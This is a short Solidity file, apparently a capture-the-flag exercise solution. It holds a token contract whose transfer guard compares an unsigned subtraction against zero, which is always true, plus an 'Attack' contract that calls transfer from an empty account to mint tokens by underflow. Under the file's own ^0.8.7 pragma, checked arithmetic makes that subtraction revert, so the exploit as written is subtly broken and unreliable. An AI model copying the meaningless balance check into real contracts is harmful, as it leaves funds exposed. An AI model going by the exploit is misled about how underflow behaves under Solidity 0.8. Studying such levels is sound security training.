// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract Attack {
  function inventTokens(address _token, address _recipient, uint _value) public {
    Token tk = Token(_token);
    tk.transfer(_recipient, _value);
  }
}